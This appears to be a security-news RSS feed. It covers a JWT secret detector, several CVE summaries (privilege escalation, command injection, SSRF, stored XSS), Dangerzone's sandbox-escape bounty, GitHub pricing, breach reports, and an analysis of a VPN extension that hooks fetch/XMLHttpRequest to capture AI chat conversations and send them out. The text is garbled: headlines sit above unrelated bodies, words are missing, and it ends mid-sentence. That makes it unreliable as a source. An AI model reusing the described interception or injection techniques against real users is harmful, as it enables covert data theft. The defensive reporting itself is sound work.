This new detector has already found hundreds of live JWTs for our customers.We recently deployed a new JSON Web Token (JWT) detector across all TruffleHog platforms, including TruffleHog Enterprise. The immediate impact has been substantial: it found hundreds of live JWTs for our customers within hours of deployment. This performance has positioned it among our top 25 detectors.Although a JWT cannot in general be verified for liveness, it  when it is signed using public-key cryptography and we can retrieve the public key. TruffleHog’s new JWT detector takes this approach, maintaining its standard of providing liveness verification for every exposed secret it reports.This post covers some of the technical details behind the new JWT detector.Refresher: JWTs are stateless auth technologyAs a reminder, JSON Web Tokens, or JWTs, are widely used for authentication and authorization in web-facing applications. They frequently appear as machine-generated short-lived credentials for cloud-based applications. They show up as strings that look like this screenshot (from the online playground at jwt.io):They’re made up of 3 base64-url-encoded sections: a header that indicates things like what cryptography is used (shown in green), a payload enumerating the  of the token (shown in white), and a cryptographic signature (shown in blue).There are a few , such as expiration time () and not-before-time (). These are very common but do not  appear. Some JWTs are issued  any expiration time or one that’s comically far in the future (like Supabase legacy API keys, which are issued with 10-year expirations).JWTs are in contrast to traditional session tokens, making authentication and authorization possible without having to consult a database or other service. The big idea is that the permissions granted to the token get embedded within the token itself, and the whole thing is cryptographically signed to guarantee authenticity and integrity.The statelessness of JWTs is good for scalability (at least in theory), but imposes several downsides. Most significantly, it’s infeasible to  a JWT, so if your JWT leaks, you're in for trouble. You can learn more about the downsides and error-prone aspects of the technology in the numerous guides written by others (1, 2, 3).How TruffleHog detects JWTsJWTs have distinctive syntactic structure: a couple base64-url-encoded JSON objects and a base64-url-encoded signature. Detection (prior to liveness verification) is straightforward:Detect candidate strings that resemble JWTs using a simple regular expression.Base64-decode and parse the candidate strings into header, payload and signature.Filter out candidate JWTs that don’t use public-key cryptography.A string that makes it through all these detection steps is a JWT that parses correctly and uses a public-key signing algorithm, ready to be verified for liveness.Verifying liveness of JWTs is different from other secret typesTruffleHog’s approach to verifying the liveness of most existing secret types is the same: make a benign network request to a specific endpoint and check that the response indicates success. Its approach to liveness verification of JWTs is different. Instead of making network requests that attempt to authenticate, it (mostly) runs locally and involves two steps: verifying the cryptographic signature and validating the claims embedded in the payload.For auth purposes, this is a delicate process where the order of steps matters. Mixing up the steps and validating the claims prior to verifying the cryptographic signature can lead to security issues (e.g., CVE-2022-23540 affecting the  library and CVE-2024-54150 affecting the  library).However, TruffleHog is finding exposed JWTs, not doing auth, which makes it safe to reorder these steps to minimize the amount of network requests needed for liveness verification. TruffleHog first validates the standard claims in the candidate JWT's payload, and  does signature verification.Given a JWT, TruffleHog first checks that its expiration time is in the future and its not-before-time, if provided, is in the past. These checks are purely local and require no network access. In practice, the liveness of most detected JWTs is disproven at this step.Once the claims of a JWT have been validated, TruffleHog then attempts to verify the signature. It uses OIDC Discovery to fetch the relevant public key, requiring two HTTP requests in the worst case. If the public key is successfully retrieved and verifies the signature, TruffleHog reports that the JWT is live.Note that this local verification of liveness is in some sense a proxy for reality. The application using the JWT for auth might disagree with the locally-determined liveness status of a token, such as if its own token validation logic is broken or if it uses an updated configuration with different signing algorithms or key servers.What JWTs will TruffleHog  detect today?JWTs that use shared-secret cryptographyThe new detector ignores JWTs signed with a shared secret (i.e., those using HMAC-based algorithms). Those JWTs are much more common than the public-key-based ones that  detected. We tested TruffleHog's new detector on several hundred gigabytes of recent content pushed to GitHub and saw shared-secret-based JWTs  than public-key ones. By ignoring the shared-secret-based JWTs, many potentially exposed JWTs go undetected, but we avoid reporting a glut of findings with unknown liveness status.We are exploring options for liveness verification of shared-secret-based JWTs in TruffleHog, such as applying password cracking techniques.JWTs from issuers at non-routing IPsSome JWTs are issued from  or other non-routing IPs (e.g., private IP ranges like 192.168.*.*). While these could  be verified for liveness, doing so would involve performing the OIDC Discovery protocol from the same network as the issuer. In general, TruffleHog is run from other hosts by developers, security teams, CI systems, etc. If an issuer refers to a non-routing IP, TruffleHog will not attempt to verify the token.JWTs from issuers that don’t support OIDC DiscoveryNot all JWTs that use public-key cryptography use OIDC Discovery. Some issuers share the public keys in alternate ways, like via other notable locations or embedded within the tokens themselves. TruffleHog does not support these alternates today, but they present obvious opportunities for enhancement.It’s not always clear what applications use an exposed JWTWhen a JWT is discovered, it’s not always obvious from the token itself what application or service it allows access to. Frequently there is identifying information embedded within the header or the claims, but not always, and sometimes you need to examine the surrounding context in which the JWT was found. This presents a challenge to understanding the full impact of exposure.Remediating exposed JWTs is tricky businessDue to their stateless nature, JWTs are difficult to revoke. They usually aren’t checked against a central database that could contain revocation information; instead they are cryptographically validated based on their signature. So to revoke a JWT you are left with 3 options:Wait for the JWT to naturally expire. This is only tenable if the JWT has a relatively short  claim.Swap out the signing key used by the issuer. Since signing keys are typically used to issue numerous JWTs, this will have the side-effect of invalidating  issued JWTs.Modify the application that uses the JWTs for authentication so that it checks a revocation database. This has substantial engineering costs and eliminates the stateless property of JWTs.If you discover an exposed JWT in your assets, you will want to find the cause of the exposure and address that through process changes or additional controls. For example, was a JWT exposed in a log file that was shared in your internal cloud storage system? Tighter default permissions for uploads and quick secrets detection could help prevent repeat incidents.TruffleHog's new JWT detector has immediately proven its value by identifying hundreds of live, exposed secrets for our customers. It continues Truffle Security's approach of reporting only live, actionable findings, even though JWTs are trickier than most other secret types.]]></content:encoded></item><item><title>Stay Secure: Why Cyber Hygiene Should Be Part of Your Personal Hygiene</title><link>https://unit42.paloaltonetworks.com/cyber-hygiene/</link><author>Ria Bhatia</author><category>threatintel</category><enclosure url="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/12/09_Listicle_Category_1505x922.jpg" length="" type=""/><pubDate>Wed, 17 Dec 2025 00:00:57 +0000</pubDate><source url="https://unit42.paloaltonetworks.com/">Unit 42</source><content:encoded><![CDATA[Cyber hygiene is just as vital as personal hygiene.

Nagios XI versions prior to 2026R1.1 are vulnerable to local privilege escalation due to an unsafe interaction between sudo permissions and application file permissions. A user‑accessible maintenance script may be executed as root via sudo and includes an application file that is writable by a lower‑privileged user. A local attacker with access to the application account can modify this file to introduce malicious code, which is then executed with elevated privileges when the script is run. Successful exploitation results in arbitrary code execution as the root user.

 Dec. 16, 2025, 10:15 p.m. | 1 hour, 26 minutes ago
SIPGO is a library for writing SIP services in the GO language. Starting in version 0.3.0 and prior to version 1.0.0-alpha-1, a nil pointer dereference vulnerability is in the SIPGO library's `NewResponseFromRequest` function that affects all normal SIP operations. The vulnerability allows remote attackers to crash any SIP application by sending a single malformed SIP request without a To header. The vulnerability occurs when SIP message parsing succeeds for a request missing the To header, but the response creation code assumes the To header exists without proper nil checks. This affects routine operations like call setup, authentication, and message handling - not just error cases. This vulnerability affects all SIP applications using the sipgo library, not just specific configurations or edge cases, as long as they make use of the `NewResponseFromRequest` function. Version 1.0.0-alpha-1 contains a patch for the issue.

Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.2 and 9.1.1-alpha.1, the Instagram authentication adapter allows clients to specify a custom API URL via the `apiURL` parameter in `authData`. This enables SSRF attacks and possibly authentication bypass if malicious endpoints return fake responses to validate unauthorized users. This is fixed in versions 8.6.2 and 9.1.1-alpha.1 by hardcoding the Instagram Graph API URL `https://graph.instagram.com` and ignoring client-provided `apiURL` values. No known workarounds are available.

systeminformation is a System and OS information library for node.js. In versions prior to 5.27.14, the `fsSize()` function in systeminformation is vulnerable to OS command injection on Windows systems. The optional `drive` parameter is directly concatenated into a PowerShell command without sanitization, allowing arbitrary command execution when user-controlled input reaches this function. The actual exploitability depends on how applications use this function. If an application does not pass user-controlled input to `fsSize()`, it is not vulnerable. Version 5.27.14 contains a patch.

But times have changed! With kids more online than ever, Santa had to adapt and start opening letters in digital form.Enter , an elf in Santa's security team (yes, Virginia, Santa has one)! 🧝 Kenny always preferred the ol' paper format. That way, he didn't need to worry about worms, bugs, and other pests that have no place in the North Pole. Begrudgingly, he yielded to the new era and set up Dangerzone in Santa's laptop to safely open email attachments. But wait! Kenny, being the cautious elf he is, decided to challenge Santa's red team to find vulnerabilities in Dangerzone before the naughty hackers do.Craft a  letter that can demonstrably bypass some or all of Dangerzone's defenses and earn a bounty 💰.ℹ️ Quick recap of how Dangerzone worksDangerzone sanitizes documents in a secure sandbox, in a process that is similar to a photocopy. It does so by spinning up a Podman container, which spins up a gVisor sandbox, which in turn reads a document. The sandbox then converts the document into a PDF, and the PDF pages into pixels. The Dangerzone logic that runs on the host converts the pixels to images, optionally OCRs them, and then creates a PDF. This PDF looks like the original document, but is safe to read and share with others.The sandbox where the document turns into pixels (/home/dangerzone/raster.flag within the gVisor sandbox).The container that spawns the gVisor sandbox for the conversion ( within the Podman container).The host of the CI job, where Dangerzone is installed ( file in the host).If you manage to capture one or more of these flags, add them in the sanitized document or print them to  from the conversion sandbox. The CI job will detect it, and the submission will be considered a success.Capturing a flag varies in difficulty. Dangerzone operates under the assumption that attackers can find vulnerabilities in the programs we use for rasterization (LibreOffice and PyMuPDF). Therefore, the  is expected to be captured at some point. The  flag requires escaping the gVisor sandbox, which is much,  more difficult. And the  flag requires combining a gVisor sandbox escape and a Linux container escape at the same time, which we haven't seen yet in the wild.Each flag is backed by a bounty, and the first PR that captures it gets that bounty 🤑. The bounty levels are:🥇  in the host: 🥈  within the Podman container: 🥉 /home/dangerzone/raster.flag within the gVisor sandbox: A PR can capture multiple flags at once, in which case it can get the full bounty, i.e., . Note that each flag can be captured once, since we need to cap the total payout to  across all submissions. In case of multiple submissions that capture the same flag, the first one wins 🏁.1. Why do we encrypt documents when we submit them?There are two primary reasons for encrypting your submissions. First, this is a public challenge, and we want to protect your ideas from being copied by others. Second, and more importantly, we aim to prevent real-world attackers from observing potential exploits and targeting our users. Encryption helps maintain the integrity and security of the challenge.2. What happens on a successful submission?If your submission is successful, we will redirect you to our Bugcrowd account to receive your reward. At the same time though, you will own the exploit. We will assist you in reaching out to the affected parties and help you claim any additional bounties they may offer for the vulnerability.3. Can I experiment with this challenge locally?Absolutely! You are encouraged to install Dangerzone locally and experiment with creating a document that can read a file from your PC during the sanitization process. Check out our CI job as well, to see how we plant the flags for the challenge. Once you have crafted your document, feel free to submit the encrypted version as a PR. Happy experimenting!4. Does my submission have to pass the sanitization step?If your submission cannot be sanitized, this means that we can't check for the captured flag in the resulting document. That's not a problem, though, since we look for flags in the conversion logs as well. If you capture a flag, you can print it to the process' stderr, and it will be included in the conversion logs. You should see it in the output of the CI job as well.5. Can I submit any other types of issues?If they undermine Dangerzone's security, you are encouraged to submit them via our Bugcrowd account, and we  assign a payout according to their severity, e.g., what flag they would potentially capture.If they target this CI job, then they are considered out of scope.6. Are we living in such desperate times that people will burn a gVisor/kernel 0-day for anything less than six figures?Of course not! We are living in the merriest of times, where people can contribute their talent to spyware companies, enjoy a big payout, and sleep soundly at night! But at the same time, and let's be real for a second, no one will waste six figures to break Dangerzone. And if they do, this means that Dangerzone will have succeeded in protecting all the rest of the users that are not economically viable targets.The scenario we want to avoid, though, is having a bug lying around that makes it trivial to bypass the defense layers Dangerzone employs. That's what we're looking for here, and the sanitization logic, for that matter, is pretty small. So, hopefully, this bounty will incentivize some folks to give our repo a look.7. Is this a CTF challenge, or a bug bounty program?It's a capped bug bounty program. The backstory is this: Dangerzone has never had a bug bounty program, as its sister project, SecureDrop, has. Our team has managed to secure some money from the bug bounty pool that was not spent this year and decided to give a festive spin to it because, well, why not? We hope that at some point in the future, we'll have an actual bug bounty program in place.]]></content:encoded></item><item><title>Microsoft Details Mitigations Against React2Shell RCE Vulnerability in React Server Components</title><link>https://cybersecuritynews.com/microsoft-details-mitigations-against-react2shell-rce-vulnerability/</link><author></author><category>security</category><pubDate>Tue, 16 Dec 2025 17:38:07 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

The free usage minute quotas will remain the same.On  GitHub will introduce a new $0.002 per minute GitHub Actions cloud platform charge that will apply to self-hosted runner usage. Any usage subject to this charge will count toward the minutes included in your plan, as explained in our GitHub Actions billing documentation.Runner usage in public repositories will  There will be no changes in price structure for GitHub Enterprise Server customers.We are increasing our investment into our self-hosted experience to ensure that we can provide autoscaling for scenarios beyond just Linux containers. This will include new approaches to scaling, new platform support, Windows support, and more as we move through the next 12 months.Why am I being charged to use my own hardware?
Historically, self-hosted runner customers were able to leverage much of GitHub Actions’ infrastructure and services at no cost. This meant that the cost of maintaining and evolving these essential services was largely being subsidized by the prices set for GitHub-hosted runners. By updating our pricing, we’re aligning costs more closely with usage and the value delivered to every Actions user,  while fueling further innovation and investment across the platform. The vast majority of users, especially individuals and small teams, will see no price increase.What are the new GitHub-hosted runner rates?
See the GitHub Actions runner pricing reference for the updated rates that will go into effect on January 1, 2026. These listed rates include the new $0.002 per-minute Actions cloud platform charge.Why is .002/minute the right price for self-hosted runners on cloud?
We determined per-minute was deemed the most fair and accurate by our users, and compared to other self-hosted CI solutions in the market. We believe this is a sustainable option that will not deeply impact our lightly- nor heavily-active customers, while still delivering fast, flexible workloads for the best end user experience.Which job execution scenarios for GitHub Actions are affected by this pricing change?Jobs that run in private repositories and use standard GitHub-hosted or self-hosted runners  Any jobs running on larger GitHub-hosted runnersStandard GitHub-hosted or self-hosted runner usage on public repositories will remain free. GitHub Enterprise Server pricing is not impacted by this change.When will this pricing change take effect?The price decrease for GitHub-hosted runners will take effect on January 1, 2026. The new charge for self-hosted runners will apply beginning on March 1, 2026. The price changes will impact all customers on these dates.Will the free usage quota available in my plan change?
Beginning March 1, 2026, self-hosted runners will be included within your free usage quota, and will consume available usage based on list price the same way that Linux, Windows, and MacOS standard runners work today.Will self-hosted runner usage consume from my free usage minutes?
Yes, billable self-hosted runner usage will be able to consume minutes from the free quota associated with your plan.How does this pricing change affect customers on GitHub Enterprise Server?This pricing change does not affect customers using GitHub Enterprise Server. Customers running Actions jobs on self-hosted runners on GitHub Enterprise Server may continue to host, manage, troubleshoot and use Actions on and in conjunction with their implementation free of charge.Can I bill my self-hosted runner usage on private repositories through Azure?Yes, as long as you have an active Azure subscription ID associated with your GitHub Enterprise or Organization(s).What is the overall impact of this change to GitHub customers?96% of customers will see no change to their bill. Of the 4% of Actions users impacted by this change, 85% of this cohort will see their Actions bill decrease and the remaining 15% who are impacted across all face a median increase around $13.Did GitHub consider how this impacts individual developers, not just Enterprise scale customers of GitHub?
From our individual users (free & Pro plans) of those who used GitHub Actions in the last month in private repos only 0.09% would end up with a price increase, with a median increase of under $2 a month. Note that this impact is after these users have made use of their included minutes in their plans today, entitling them to over 33 hours of included GitHub compute, and this has no impact on their free use of public repos. A further 2.8% of this total user base will see a decrease in their monthly cost as a result of these changes. The rest are unimpacted by this change.How can I figure out what my new monthly cost for Actions looks like?We have also updated our Actions pricing calculator, making it easier to estimate your future costs, particularly if your historical usage is limited or not representative of expected future usage.]]></content:encoded></item><item><title>Texas sues TV makers for taking screenshots of what people watch</title><link>https://www.bleepingcomputer.com/news/security/texas-sues-tv-makers-for-spying-on-users-selling-data-without-consent/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Tue, 16 Dec 2025 17:29:22 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The Texas Attorney General sued five major television manufacturers, accusing them of illegally collecting their users' data by secretly recording what they watch using Automated Content Recognition (ACR) technology.

FileRise is a self-hosted web file manager / WebDAV server. Versions prior to 2.7.1 are vulnerable to Stored Cross-Site Scripting (XSS) due to unsafe handling of browser-renderable user uploads when served through the sharing and download endpoints. An attacker who can get a crafted SVG (primary) or HTML (secondary) file stored in a FileRise instance can cause JavaScript execution when a victim opens a generated share link (and in some cases via the direct download endpoint). This impacts share links (`/api/file/share.php`) and direct file access / download path (`/api/file/download.php`), depending on browser/content-type behavior. Version 2.7.1 fixes the issue.

They differ on many levels. To news media, the size of the brand, how many users were impacted, and how it was done often dominate the headlines. For victims, what really matters is the type of information stolen. And for the organizations involved, the focus is on how they will handle the incident. So, let’s have a look at the three that showed up in the news feeds today.700Credit is a US provider of credit reports, preliminary credit checks, identity verification, fraud detection, and compliance tools for automobile, recreational vehicle, powersports, and marine dealerships.In a notice on its website, 700Credit informed media, partners, and affected individuals that it suffered a third-party supply-chain attack in late October 2025. According to the notice, an attacker gained unauthorized access to personally identifiable information (PII), including names, addresses, dates of birth, and Social Security numbers (SSNs). The breach involves data collected between May and October, impacting roughly 5.6 million people.The supply-chain attack demonstrates the importance of how you handle attacks. Reportedly, 700Credit communicates with more than 200 integration partners through application programming interfaces (APIs). When one of the partners was compromised in July, they failed to notify 700Credit. As a result, unnamed cybercriminals broke into that third-party’s system and exploited an API used to pull consumer information.700Credit shut down the exposed third-party API, notified the FBI and FTC, and is mailing letters to victims offering credit monitoring while coordinating with dealers and state regulators.SoundCloud is a leading audio streaming platform where users can upload, promote, stream, and share music, podcasts, and other audio content.SoundCloud posted a notice on its website stating that it recently detected unauthorized activity in an ancillary service dashboard. Ancillary services refer to specialized functions that help maintain stability and reliability. When SoundCloud contained the attack, it experienced denial-of-service attacks, two of which were able to temporarily disable its platform’s availability on the web.An investigation found that no sensitive data such as financial or password data was accessed. The exposed data consisted of email addresses and information already visible on public SoundCloud profiles. The company estimates the incident affected roughly 20% of its user base.Pornhub is one of the world’s most visited adult video-sharing websites, allowing users to view content anonymously or create accounts to upload and interact with videos.Reportedly, Pornhub disclosed that on November 8, 2025, a security breach at third-party analytics provider Mixpanel exposed “a limited set of analytics events for certain users.” Pornhub stressed that this was not a breach of Pornhub’s own systems, and said that passwords, payment details, and financial information were not exposed. Mixpanel, however, disputes that the data originated from its November 2025 security incident.According to reports, the ShinyHunters ransomware group claims to have obtained about 94 GB of data containing more than 200 million analytics records tied to Pornhub Premium activity. ShinyHunters shared a data sample with BleepingComputer that included a Pornhub Premium member’s email address, activity type, location, video URL, video name, keywords associated with the video, and the time the event occurred.ShinyHunters has told BleepingComputer that it sent extortion demands to Pornhub, and the nature of the exposed data creates clear risks for blackmail, outing, and reputational harm—even though no Social Security numbers, government IDs, or payment card details are in the scope of the breach.As you can see, these are three very different data breaches. Not just in how they happened, but in what they mean for the people affected. While email addresses and knowing that someone uses SoundCloud could be useful for phishers and scammers, it’s a long way from the leverage that comes with detailed records of Pornhub Premium activity. If that doesn’t get you on the list of a “hello pervert” scammer, I don’t know what will.But undoubtedly the most dangerous one for those affected is the 700Credit breach which provides an attacker with enough information for identity theft. In the other cases an attacker will have to penetrate another defense layer, but with a successful identity theft the attacker has reached an important goal.Estimated ~28–36 million users (about 20% of users) ​“Select” Premium users; ~201 million activity records (not 201 million people) ​Email addresses and public profile info ​Names, addresses, dates of birth, SSNs ​​Search, watch, and download activity; attacker-shared samples include email addresses, timestamps, and IP/geo-location dataLow (mostly already public contact/profile data) ​Very high (classic identity‑theft PII) ​​Very high (intimate behavioral and preference data, blackmail/extortion potential) ​Unauthorized access to an internal service dashboard ​Third‑party API compromise (supply‑chain attack) ​​Disputed incident involving third-party analytics data (Mixpanel), following a smishing campaignWe don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

addressing bug classes holistically, and identifying vulnerabilities. Not
everything we try works, and we think it’s important to document our
shortcomings in addition to our successes. A responsible project uses all
available tools to find bugs and vulnerabilities before you ship. Besides
many other tools and techniques, Firefox uses Clang Tidy and the Clang
Static Analyzer, including many customized checks for enforcing the coding
conventions in the project. To extend these tools, Mozilla contacted Balázs,
as one of the maintainers of the Clang Static Analyzer, to help address
problems encountered when exploring Cross Translation Unit (CTU) Static
Analysis. Ultimately, we weren’t able to make as much headway with this
project as we hoped, but we wanted to contribute our experience to the
community and hopefully inspire future work. Be warned, this is a highly
technical blog post.The following sections describe some fundamental concepts, such as taint
analysis, CTU, the Clang Static Analyzer engine. This will be followed by
the problem statement and the solution. Finally, some closing words.Disclaimer: The work described here was sponsored by Mozilla.Static Analysis FundamentalsVulnerabilities often root from using untrusted data in some way. Data from
such sources is called “tainted” in static analysis, and “taint analysis” is the
technique that tracks how such “tainted” values propagate or “flow”
throughout the program.In short, “Taint sources” introduce a flow, such as reading from a socket. If
a tainted value reaches a “taint sink” then we should report an error. These
“sources” and “sinks” are often configurable.A YAML configuration file can be used with the Clang Static Analyzer
configuring the taint rules.Cross Translation Unit (CTU) analysisThe steps involved in bugs or vulnerabilities might cross file boundaries.
Conventional static analysis tools that operate on a translation-unit basis
would not find the issue. Luckily, the Clang Static Analyzer offers CTU
mode
that loads the relevant pieces of the required translation units to
enhance the contextual view of the analysis target, thus increasing the
covered execution paths. Running CTU needs a bit of setup, but luckily
tools like scan-build
or CodeChecker have built-in support.The Clang Static Analyzer implements a path-sensitive symbolic execution.
Here is an excellent talk
but let us give a refresher here.Basically, it interprets the abstract syntax tree (AST) of the analyzed C/C++
program and builds up program facts statement by statement as it
simulates different execution paths of the program. If it sees an 
statement, it splits into two execution paths: one where the condition is
assumed to be false, and another one where it’s assumed to be true. Loops
are handled slightly differently, but that’s not the point of this post today.When the engine sees a function call, it will jump to the definition of the
callee (if available) and continue the analysis there with the arguments we
had at the call-site. We call this “inlining” in the Clang Static Analyzer. This
makes this engine inter-procedural, in other words, reason across
functions. Of course, this only works if it knows the callee. This means that
without knowing the pointee of a function pointer or the dynamic type of a
polymorphic object (that has virtual functions), it cannot “inline” the callee,
which in turn means that the engine must conservatively relax the program
facts it gathered so far because they might be changed by the callee.For example, if we have some allocated memory, and we pass that pointer
to such a function, then the engine must assume that the pointer was
potentially released, and not raise leak warnings after this point.The conclusion here is that following the control-flow is critical, and virtual
functions limit our ability to reason about this if we don’t know the dynamic
type of objects.So, taint analysis for Firefox?Firefox has a lot of virtual functions!We discussed that control-flow is critical for taint analysis, and virtual
functions ruin the control-flow. A browser has almost every code pattern
you can imagine, and it so happens that many of the motivating use cases
for this analysis involve virtual functions that also happen to cross file
boundaries.It all started by Tom creating a couple of GitHub issues, like 
#114270
(which prompted a couple smaller fixes that are not the subject of this port),
and #62663.This latter one was blocked by not being able to follow the callees of virtual
functions, kicking off this whole subject and the prototype.Plotting against virtual functionsLet’s just look at the AST and build the inheritance graph. After that, if we
see a virtual call to , we could check who overrides this method.Let’s say only class  and  overrides this method in the translation unit.
This means we could split the path into 2 and assume that on one path we
call  and on the other one .This looks nice and simple, and the core of the idea is solid. However, there
are a couple of problems:One translation unit (TU) might define a class , overriding
, and then pass a  pointer to the other translation unit.
And when that TU is analyzed, it shouldn’t be sure that only class 
and  overrides  just because it didn’t see  from the
other TU.
This is the problem with inheritance, which is an “open-set” relation.
One cannot be sure to see the whole inheritance graph all at once.It’s not only that  might be in a different TU, but it might be in
a 3rd party library, and dynamically loaded at runtime. In this case,
assuming a finite set of callees for a virtual function would be wrong.Fixing problem (2) is easy, as we should just assume that the list of
potential callees always has an extra unknown callee, to have an execution
path where the call is conservatively evaluated and do the invalidations -
just like before.Fixing problem (1) is more challenging because we need whole-program
analysis. We need to create the inheritance graphs of each TU and then
merge them into a unified graph. Once we’ve built that, we can run the
Clang Static Analyzer and start reasoning about the overriders of virtual
functions in the whole project.
Consequently, in the example we discussed before, we would know that
class ,  and (crucially)  overrides . So after the call,
we would have 4 execution paths: , ,  and the last path is for
the unknown case (like potentially dynamically loading some library that
overrides this method).It sounds great, but does it work?It does! The analysis gives a list of the potential overriders of a virtual
function. The Clang Static Analyzer was modified to do the path splits we
discussed and remember the dynamic type constraints we learn on the
way. There is one catch though.Some taint flows cross file boundaries, and the Clang Static Analyzer has
CTU to counter this, right?CTU uses the “ASTImporter”,
which is known to have infinite recursion,
crashes and incomplete implementation in terms of what constructs it can
import. There are plenty of examples, but one we encountered
was #123093.Usually fixing one of these is time consuming and needs a deep
understanding of the ASTImporter. And even if you fix one of these, there
will be plenty of others to follow.This patch for “devirtualizing” virtual function calls didn’t really help with the
reliability of the ASTImporter. As the interesting taint flows cross file
boundaries, the benefits of this new feature are unfortunately limited by the
ASTImporter for Firefox.Is it available in the Clang Static Analyzer already?Unfortunately no, and as the contract was over, it is unlikely that these
patches would merge upstream without others splitting up the patches and
doing the labor of proposing them upstream. Note that this whole program
analysis is a brand new feature and it was just a quick prototype to check
the viability.Upstreaming would likely also need some wider consensus about the
design.Apparently, whole-project analyses could be important for other domains
besides bug-finding, such as code rewriting tools, which was the motivation
for a 
recently posted RFC. 
The proposed framework in that RFC could
potentially also work for the use-case described in this blog post, but it’s
important to highlight that this prototype was built before that RFC and
framework, consequently it’s not using that.Balázs shared that working on the prototype was really motivating at first,
but as he started to hit the bugs in the ASTImporter - effectively blocking
the prototype - development slowed down. All in all, the prototype proved
that using project-level information, such as “overriders”, could enable
better control-flow modeling, but CTU analysis as we have it in Clang today
will show its weaknesses when trying to resolve those calls. Without
resolving these virtual calls, we can’t track taint flows across file boundaries
in the Clang Static Analyzer.What does this mean for Firefox?Not much, unfortunately. If the ASTImporter would work as expected, then
finalizing the prototype would meaningfully improve taint analysis on code
using virtual functions.Bonus: We need to talk about the ASTImporterFrom the cases Balázs looked at, it seems like qualified names, such as
 in  for example, will trigger the import of a DeclContext,
which in turn triggers the import of all the declarations within
that lexical declaration context. In other words, we start importing a lot
more things than strictly necessary to make the  qualification work.
This in turn increases the chances of hitting something that causes a crash
or just fails to import, poisoning the original AST we wanted to import into.
This is likely not how it should work, and might be a good subject to discuss
in the future.Note that the ASTImporter can be configured to do so-called “minimal
imports” which is
probably what we should have for the Clang Static
Analyzer, however, 
this is not set,
and setting it would lead to even more crashes. Balázs didn’t investigate this
further, but it might be something to explore in the future.]]></content:encoded></item><item><title>Compromised IAM Credentials Power a Large AWS Crypto Mining Campaign</title><link>https://thehackernews.com/2025/12/compromised-iam-credentials-power-large.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidILz5c0w2u5MowpqpDcKaSi80yphNWTH5E6d3P9RbsKmrW49tTXLVGax2PmBg1tqbV05p_KchUWn15gqUmKNvzGPFUTa8QpmLO5zAAdT91Gcs0SbpZlMLPrf7cRmAoA_zULMCb1nIVGPp1w_yLPRclMOLJUQgH-safnADcwg3SkHT_Qfn3xbcKlDkOiub/s1600/aws.jpg" length="" type=""/><pubDate>Tue, 16 Dec 2025 16:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[An ongoing campaign has been observed targeting Amazon Web Services (AWS) customers using compromised Identity and Access Management (IAM) credentials to enable cryptocurrency mining.

Like I've grown used to doing, I opened Claude and started thinking out loud-laying out the options, weighing the tradeoffs, asking for perspective.Midway through the conversation, I paused. I realized how much I'd shared: not just this decision, but months of conversations-personal dilemmas, health questions, financial details, work frustrations, things I hadn't told anyone else. I'd developed a level of candor with my AI assistant that I don't have with most people in my life.And then an uncomfortable thought: what if someone was reading all of this?The thought didn't let go. As a security researcher, I have the tools to answer that question.We asked Wings, our agentic-AI risk engine, to scan for browser extensions with the capability to read and exfiltrate conversations from AI chat platforms. We expected to find a handful of obscure extensions-low install counts, sketchy publishers, the usual suspects.The results came back with something else entirely.Near the top of the list: Urban VPN Proxy. A Chrome extension with over 6 million users. A 4.7-star rating from 58,000 reviews. A "Featured" badge from Google, meaning it had passed manual review and met what Google describes as "a high standard of user experience and design."A free VPN promising privacy and security. Exactly the kind of tool someone installs when they  to protect themselves online.We decided to look closer.Urban VPN Proxy targets conversations across ten AI platforms:For each platform, the extension includes a dedicated "executor" script designed to intercept and capture conversations. The harvesting is enabled by default through hardcoded flags in the extension's configuration:There is no user-facing toggle to disable this. The only way to stop the data collection is to uninstall the extension entirely.The data collection operates independently of the VPN functionality. Whether the VPN is connected or not, the harvesting runs continuously in the background.Here's the technical breakdown:1. Script injection into AI platformsThe extension monitors your browser tabs. When you visit any of the targeted AI platforms (ChatGPT, Claude, Gemini, etc.), it injects an "executor" script directly into the page. Each platform has its own dedicated script - chatgpt.js, claude.js, gemini.js, and so on.2. Overriding native browser functionsOnce injected, the script overrides fetch() and XMLHttpRequest - the fundamental browser APIs that handle all network requests. This is an aggressive technique. The script wraps the original functions so that every network request and response on that page passes through the extension's code first.This means when Claude sends you a response, or when you submit a prompt to ChatGPT, the extension sees the raw API traffic before your browser even renders it.The injected script parses the intercepted API responses to extract conversation data - your prompts, the AI's responses, timestamps, conversation IDs. This data is packaged and sent via window.postMessage to the extension's content script, tagged with the identifier PANELOS_MESSAGE.4. Exfiltration via background workerThe content script forwards the data to the extension's background service worker, which handles the actual exfiltration. The data is compressed and transmitted to Urban VPN's servers at endpoints including analytics.urban-vpn.com and stats.urban-vpn.com.Every prompt you send to the AIEvery response you receiveConversation identifiers and timestampsThe specific AI platform and model usedThe AI conversation harvesting wasn't always there. Based on our analysis:: No AI harvesting functionality: Version 5.5.0 released with AI harvesting enabled by default: All user conversations with targeted AI platforms captured and exfiltratedChrome and Edge extensions auto-update by default. Users who installed Urban VPN for its stated purpose - VPN functionality - woke up one day with new code silently harvesting their AI conversations.Anyone who used ChatGPT, Claude, Gemini, or the other targeted platforms while Urban VPN was installed after July 9, 2025 should assume those conversations are now on Urban VPN's servers and have been shared with third parties. Medical questions, financial details, proprietary code, personal dilemmas - all of it, sold for "marketing analytics purposes."What "AI Protection" Actually DoesUrban VPN's Chrome Web Store listing promotes "AI protection" as a feature:"Advanced VPN Protection - Our VPN provides added security features to help shield your browsing experience from phishing attempts, malware, intrusive ads and AI protection which checks prompts for personal data (like an email or phone number), checks AI chat responses for suspicious or unsafe links and displays a warning before click or submit your prompt."The framing suggests the AI monitoring exists to  you-checking for sensitive data you might accidentally share, warning you about suspicious links in responses.The code tells a different story. The data collection and the "protection" notifications operate independently. Enabling or disabling the warning feature has no effect on whether your conversations are captured and exfiltrated. The extension harvests everything regardless.The protection feature shows occasional warnings about sharing sensitive data with AI companies. The harvesting feature sends that exact sensitive data - and everything else - to Urban VPN's own servers, where it's sold to advertisers. The extension warns you about sharing your 